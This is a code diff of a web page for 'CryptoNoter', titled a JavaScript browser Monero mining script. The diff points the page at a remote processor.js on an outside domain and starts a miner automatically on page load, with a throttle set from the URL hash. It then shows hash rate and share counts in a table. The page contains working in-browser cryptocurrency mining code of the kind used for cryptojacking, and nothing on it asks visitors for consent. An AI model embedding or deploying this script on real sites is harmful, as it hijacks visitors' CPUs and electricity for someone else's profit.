@@ -5,45 +5,77 @@
 	<meta charset="UTF-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1.0">
 	<meta http-equiv="X-UA-Compatible" content="ie=edge">
-	<title>CryptoNoter</title>
+	<title>CryptoNoter - Javascript Browser XMR Mining Script</title>
 	<style>
 		th {
 			width: 180px;
 		}
 	</style>
-	<script src="https://%CryptoNoter_domain%/processor.js"></script>
+	<script src="https://www.cryptonoter.com/processor.js"></script>
 	<script>
 		var addr = 'CryptoNoter';
 		var miner = new CryptoNoter.Anonymous(addr, {
 			throttle: 0.3
 		});
 		miner.start();
+
 		// Listen on events
 		var found = 0,
 			accepted = 0;
 		miner.on('found', function () {
 			found++;
+			document.getElementById("FoundShares").innerHTML = found;
 		});
 		miner.on('accepted', function () {
 			accepted++;
 		})
+
 		// Update stats once per second
 		setInterval(function () {
 			var idle = parseFloat(location.hash.split('#')[1]) || 0.5;
 			var hashesPerSecond = miner.getHashesPerSecond();
-			var totalHashes = miner.getTotalHashes();
-			var acceptedHashes = miner.getAcceptedHashes();
+			document.getElementById("TotalHashes").innerHTML = miner.getTotalHashes();
+			document.getElementById("VerifiedShares").innerHTML = miner.getAcceptedHashes();
+			document.getElementById("Hashes").innerHTML = hashesPerSecond;
 			miner.setThrottle(idle);
-			document.body.innerHTML = '<h2>CryptoNoter User : ' + addr +
-				'</h2><table border="1"><tr><th>Threads</th><th>Total Hashes</th><th>Shares Found</th><th>Shares Verfied</th></tr><tr><td>' + parseInt(
-					hashesPerSecond) + '</td><td>' + totalHashes + '</td><td>' + found + '</td><td>' + accepted +
-				'</td></tr></<table>';
+			document.getElementById("Hashes").innerHTML = hashesPerSecond;
+
 		}, 500);
+
+
 	</script>
 </head>
 
 <body>
-	CryptoNoter
+<table width='930' cellpadding= '5' cellspacing='0'style='margin:0px;font-size:14px;' />
+<tr>
+	<td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Hash Rate / Sec</b>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Total Hashes</b>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Shares Found</b>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<b>Shares Verfied</b>
+	</td>
+</tr>
+<tr>
+	<td width='150' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="Hashes">0</div>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="TotalHashes">0</div>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="FoundShares">0</div>
+	</td>
+	<td width='195' align='left' valign='top' style='border-bottom: 1px solid #d6d5d5;'>
+		<div id="VerifiedShares">0</div>
+	</td>
+</tr>
+</table>
 </body>
-
 </html>
